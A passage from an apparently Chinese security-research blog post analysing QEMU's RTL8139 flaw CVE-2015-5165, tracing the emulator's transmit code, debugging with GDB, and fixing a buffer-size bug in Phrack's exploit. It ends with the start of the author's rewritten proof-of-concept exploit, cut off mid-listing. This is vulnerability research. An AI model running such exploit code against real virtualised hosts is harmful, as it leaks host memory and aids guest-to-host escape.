class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>PMIO 的读写函数可以从变量 <code>rtl8139_io_ops</code> 中找到：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> MemoryRegionOps rtl8139_io_ops = &#123;</span><br><span class="line">    .read = rtl8139_ioport_read,</span><br><span class="line">    .write = rtl8139_ioport_write,</span><br><span class="line">    .impl = &#123;</span><br><span class="line">        .min_access_size = <span class="number">1</span>,</span><br><span class="line">        .max_access_size = <span class="number">4</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    .endianness = DEVICE_LITTLE_ENDIAN,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>PMIO 写函数 <code>rtl8139_ioport_write</code> 的定义如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">rtl8139_ioport_write</span><span class="params">(<span class="keyword">void</span> *opaque, hwaddr addr,</span></span></span><br><span class="line"><span class="function"><span class="params">                                 <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (size) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        rtl8139_io_writeb(opaque, addr, val);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        rtl8139_io_writew(opaque, addr, val);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        rtl8139_io_writel(opaque, addr, val);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>写的长度可以是字节、字、双字，这里以字节为单位的 PMIO 写函数为 <code>rtl8139_io_writeb</code> ，定义如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">rtl8139_io_writeb</span><span class="params">(<span class="keyword">void</span> *opaque, <span class="keyword">uint8_t</span> addr, <span class="keyword">uint32_t</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    RTL8139State *s = opaque;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (addr)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> MAC0 ... MAC0+<span class="number">4</span>:</span><br><span class="line">            s-&gt;phys[addr - MAC0] = val;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">// ......</span></span><br><span class="line">        <span class="keyword">case</span> TxPoll:</span><br><span class="line">            DPRINTF(<span class="string">"C+ TxPoll write(b) val=0x%02x\n"</span>, val);</span><br><span class="line">            <span class="keyword">if</span> (val &amp; (<span class="number">1</span> &lt;&lt; <span class="number">7</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                DPRINTF(<span class="string">"C+ TxPoll high priority transmission (not "</span></span><br><span class="line">                    <span class="string">"implemented)\n"</span>);</span><br><span class="line">                <span class="comment">//rtl8139_cplus_transmit(s);</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (val &amp; (<span class="number">1</span> &lt;&lt; <span class="number">6</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                DPRINTF(<span class="string">"C+ TxPoll normal priority transmission\n"</span>);</span><br><span class="line">                rtl8139_cplus_transmit(s);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">// ......</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当往 <code>TxPoll</code> 写入数据时，可以触发 <code>C+ TxPoll normal priority transmission</code> ，即调用函数 <code>rtl8139_cplus_transmit</code> ，定义如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">rtl8139_cplus_transmit</span><span class="params">(RTL8139State *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> txcount = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (rtl8139_cplus_transmit_one(s))</span><br><span class="line">    &#123;</span><br><span class="line">        ++txcount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Mark transfer completed */</span></span><br><span class="line">    <span class="keyword">if</span> (!txcount)</span><br><span class="line">    &#123;</span><br><span class="line">        DPRINTF(<span class="string">"C+ mode : transmitter queue stalled, current TxDesc = %d\n"</span>,</span><br><span class="line">            s-&gt;currCPlusTxDesc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* update interrupt status */</span></span><br><span class="line">        s-&gt;IntrStatus |= TxOK;</span><br><span class="line">        rtl8139_update_irq(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该函数会循环调用 <code>rtl8139_cplus_transmit_one</code> ，也就是存在漏洞的函数！</p>
<h3 id="4-4-漏洞触发"><a href="#4-4-漏洞触发" class="headerlink" title="4.4 漏洞触发"></a>4.4 漏洞触发</h3><p>弄清楚漏洞的原理之后，编写 PoC 就比较简单了！对 Linux 和硬件接触不多的初学者（比如笔者自己），建议尝试理解每一行代码的作用，遇到不懂的概念就 Google 一下，代码不 Work 就 Debug 一下，在这个过程中可以学到很多新的知识，这也正是分析该漏洞的出发点。</p>
<p>在主机中可以通过 GDB 附加到 QEMU 进程 <code>qemu-system-x86</code> 进行调试，触发漏洞的位置如下：</p>
<p><img src="/uploads/202006/qemu-gdb-debug.png" alt="GDB 调试 QEMU 漏洞 CVE-2015-5165"></p>
<p><strong>调试过程中遇到的几个坑：</strong></p>
<p><strong>(I)</strong> 在构造数据包时，Ethernet Frame 的源 MAC 地址、目标 MAC 地址需要填充为 QEMU 虚拟机 RTL8139 网卡的 MAC 地址，通过 <code>ifconfig -a</code> 命令可以查看本机所有网卡的数据；笔者一开始使用的 <code>ifconfig</code> 命令，结果偏偏没有打印 RTL8139 网卡的信息，导致填充了错误的 MAC 地址，通过调试 QEMU 进程才发现 MAC 地址不一致；</p>
<p><strong>(II)</strong> Phrack 文章 [1] 提供的 Exploit 代码中 <code>rtl8139_tx_desc</code> 是栈上的局部变量，实际测试时发现获取不到在内存中的物理地址（Guest Physical Address），改为从堆上动态申请内存即可；调试发现是笔者自己实现的获取物理内存地址的代码有问题，因为栈的地址很高，转换成有符号数是一个负数，所以在调用 <code>fseek</code> 的时候需要处理好符号问题，否则 <code>fseek</code> 会失败；</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!fseek(fp, (<span class="keyword">unsigned</span> <span class="keyword">long</span>)addr / PAGE_SIZE * <span class="number">8</span>, SEEK_SET)) </span><br><span class="line">&#123;</span><br><span class="line">    fread(&amp;pfn, <span class="keyword">sizeof</span>(pfn), <span class="number">1</span>, fp);</span><br><span class="line">    <span class="keyword">if</span> (pfn &amp; PFN_PRESENT) </span><br><span class="line">    &#123;</span><br><span class="line">        pfn &amp;= PFN_PFN;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>(III)</strong> 在 QEMU 虚拟机测试 PoC 时，发现打印接收到的数据的时候进程 Crash 了，从打印出来的调用栈来看，应该是接收缓冲区溢出了：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo ./a.out</span></span><br><span class="line">*** Error in `./a.out': corrupted size vs. prev_size: 0x092975e8 ***</span><br><span class="line">======= Backtrace: =========</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(+0x67377)[0xb75af377]</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(+0x6d2f7)[0xb75b52f7]</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(+0x6f979)[0xb75b7979]</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(__libc_malloc+0xc5)[0xb75b8fc5]</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(_IO_file_doallocate+0x6e)[0xb75a592e]</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(_IO_doallocbuf+0x47)[0xb75b31c7]</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(_IO_file_overflow+0x1c1)[0xb75b2561]</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(_IO_file_xsputn+0x94)[0xb75b1684]</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(_IO_vfprintf+0x193)[0xb758a253]</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(_IO_printf+0x26)[0xb7591696]</span><br><span class="line">./a.out[0x8048b1e]</span><br><span class="line">./a.out[0x8048c61]</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf7)[0xb7560637]</span><br><span class="line">./a.out[0x80485b1]</span><br></pre></td></tr></table></figure>
<p>调试发现 Phrack 文章 [1] 末尾给出的代码存在一个 Bug，而这个 Bug 居然没有人发现，笔者搜索了国内相关的技术文章，发现都照搬了这个 Bug 。其他人没有发现这里的问题，可能是由于分析环境的不同所造成的：</p>
<ul>
<li>笔者的 QEMU 虚拟机中安装的是 Ubuntu 官方发行的 Server 版本</li>
<li>其他文章中的 QEMU 虚拟机中安装的是临时编译的 Linux 系统</li>
</ul>
<p>对该 Bug 的分析如下：</p>
<ol>
<li>函数 <code>rtl8139_cplus_transmit_one</code> 在发送分片后的 Ethernet Frame 时，数据包的大小是 <code>1514</code> 字节；</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> tcp_chunk_size = ETH_MTU - hlen - tcp_hlen;</span><br><span class="line"><span class="comment">// ......</span></span><br><span class="line"><span class="keyword">uint16_t</span> chunk_size = tcp_chunk_size;</span><br><span class="line"><span class="comment">// ......</span></span><br><span class="line"><span class="keyword">int</span> tso_send_size = ETH_HLEN + hlen + tcp_hlen + chunk_size;</span><br><span class="line">rtl8139_transfer_frame(s, saved_buffer, tso_send_size,</span><br><span class="line">    <span class="number">0</span>, (<span class="keyword">uint8_t</span> *) dot1q_buffer);</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>因为是发给本机的数据，所以执行流程经由 <code>rtl8139_transfer_frame</code> 进入 <code>rtl8139_do_receive</code> ，这里会检查接收缓冲区是否还有多余的 <code>4</code> 字节空间用于填充 Checksum ；</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint32_t</span> rx_space = rxdw0 &amp; CP_RX_BUFFER_SIZE_MASK;</span><br><span class="line"><span class="comment">// ......</span></span><br><span class="line"><span class="keyword">if</span> (size+<span class="number">4</span> &gt; rx_space)</span><br><span class="line">&#123;</span><br><span class="line">    DPRINTF(<span class="string">"C+ Rx mode : descriptor %d size %d received %d + 4\n"</span>,</span><br><span class="line">        descriptor, rx_space, size);</span><br><span class="line">    <span class="comment">// error handling ......</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">dma_addr_t</span> rx_addr = rtl8139_addr64(rxbufLO, rxbufHI);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* receive/copy to target memory */</span></span><br><span class="line"><span class="keyword">if</span> (dot1q_buf) &#123;</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    pci_dma_write(d, rx_addr, buf, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ......</span></span><br><span class="line"><span class="comment">/* write checksum */</span></span><br><span class="line">val = cpu_to_le32(crc32(<span class="number">0</span>, buf, size_));</span><br><span class="line">pci_dma_write(d, rx_addr+size, (<span class="keyword">uint8_t</span> *)&amp;val, <span class="number">4</span>);</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>Phrack 文章 [1] 对接收缓冲区的设置位于函数 <code>rtl8139_desc_config_rx</code> ，可以每一个 <code>ring / descriptor</code> 关联的缓冲区的大小是 <code>RTL8139_BUFFER_SIZE</code> 即 <code>1514</code> 字节，但是 <code>dw0</code> 标志中设置的大小却是 <code>USHRT_MAX</code> 即 <code>65535</code> ；</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl8139_desc_config_rx</span><span class="params">(struct rtl8139_ring *ring,</span></span></span><br><span class="line"><span class="function"><span class="params">                            struct rtl8139_desc *desc, <span class="keyword">int</span> nb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">uint32_t</span> addr;</span><br><span class="line">	<span class="keyword">size_t</span> i;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nb; i++) &#123;</span><br><span class="line">		ring[i].desc = &amp;desc[i];</span><br><span class="line">		<span class="built_in">memset</span>(ring[i].desc, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct rtl8139_desc));</span><br><span class="line"></span><br><span class="line">		ring[i].buffer = aligned_alloc(PAGE_SIZE, RTL8139_BUFFER_SIZE);</span><br><span class="line">		<span class="built_in">memset</span>(ring[i].buffer, <span class="number">0</span>, RTL8139_BUFFER_SIZE);</span><br><span class="line"></span><br><span class="line">		addr = (<span class="keyword">uint32_t</span>)gva_to_gpa(ring[i].buffer);</span><br><span class="line"></span><br><span class="line">		ring[i].desc-&gt;dw0 |= CP_RX_OWN;</span><br><span class="line">		<span class="keyword">if</span> (i == nb - <span class="number">1</span>)</span><br><span class="line">			ring[i].desc-&gt;dw0 |= CP_RX_EOR;</span><br><span class="line">		ring[i].desc-&gt;dw0 &amp;= ~CP_RX_BUFFER_SIZE_MASK;</span><br><span class="line">		ring[i].desc-&gt;dw0 |= USHRT_MAX;</span><br><span class="line">		ring[i].desc-&gt;buf_lo = addr;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	addr = (<span class="keyword">uint32_t</span>)gva_to_gpa(desc);</span><br><span class="line">	outl(addr, RTL8139_PORT + RxRingAddrLO);</span><br><span class="line">	outl(<span class="number">0x0</span>, RTL8139_PORT + RxRingAddrHI);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="4">
<li>这样的设置显然是不对的，这会导致可以通过函数 <code>rtl8139_do_receive</code> 中的缓冲区大小检查，后面在写入 Checksum 时会导致堆块越界写，这就是导致 QEMU 虚拟机中 PoC 进程 Crash 的原因；</li>
</ol>
<p>参考 Phrack 文章的代码，笔者重写的一份用于测试 CVE-2015-5165 的完整 PoC 代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 页面相关参数</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PFN ((1ull &lt;&lt; 55) - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Ethernet Frame 大小</span></span><br><span class="line"><span class="comment">// DST(6) + SRC(6) + Length/Type(2) + PayloadMTU(1500)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RTL8139_BUFFER_SIZE 1514</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// RTL8139 网卡 PMIO 地址</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RTL8139_PORT 0xc000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Rx ownership flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_RX_OWN (1&lt;&lt;31)</span></span><br><span class="line"><span class="comment">// w0 end of ring flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_RX_EOR (1&lt;&lt;30)</span></span><br><span class="line"><span class="comment">// Rx buffer size mask 表示 0 ~ 12 位为 buffer size</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_RX_BUFFER_SIZE_MASK ((1&lt;&lt;13) - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Tx ownership flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_OWN (1&lt;&lt;31)</span></span><br><span class="line"><span class="comment">// Tx end of ring flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_EOR (1&lt;&lt;30)</span></span><br><span class="line"><span class="comment">// last segment of received packet flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_LS (1&lt;&lt;28)</span></span><br><span class="line"><span class="comment">// large send packet flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_LGSEN (1&lt;&lt;27)</span></span><br><span class="line"><span class="comment">// IP checksum offload flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_IPCS (1&lt;&lt;18)</span></span><br><span class="line"><span class="comment">// TCP checksum offload flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_TCPCS (1&lt;&lt;16)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// RTL8139 网卡寄存器偏移地址</span></span><br><span class="line"><span class="keyword">enum</span> RTL8139_registers </span><br><span class="line">&#123;</span><br><span class="line">    TxAddr0      = <span class="number">0x20</span>,    <span class="comment">// Tx descriptors address</span></span><br><span class="line">    ChipCmd      = <span class="number">0x37</span>,</span><br><span class="line">    TxConfig     = <span class="number">0x40</span>,</span><br><span class="line">    RxConfig     = <span class="number">0x44</span>,</span><br><span class="line">    TxPoll       = <span class="number">0xD9</span>,    <span class="comment">// tell chip to check Tx descriptors for work</span></span><br><span class="line">    CpCmd        = <span class="number">0xE0</span>,    <span class="comment">// C+ Command register (C+ mode only)</span></span><br><span class="line">    <span class="comment">// 虽然名字写的 RxRingAddr, 但实际上是 Rx descriptor 的地址</span></span><br><span class="line">    RxRingAddrLO = <span class="number">0xE4</span>,    <span class="comment">// 64-bit start addr of Rx descriptor</span></span><br><span class="line">    RxRingAddrHI = <span class="number">0xE8</span>,    <span class="comment">// 64-bit start addr of Rx descriptor</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> RTL_8139_tx_config_bits </span><br><span class="line">&#123;</span><br><span class="line">    TxLoopBack = (<span class="number">1</span> &lt;&lt; <span class="number">18</span>) | (<span class="number">1</span> &lt;&lt; <span class="number">17</span>), <span class="comment">// enable loopback test mode</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> RTL_8139_rx_mode_bits </span><br><span class="line">&#123;</span><br><span class="line">    AcceptErr       = <span 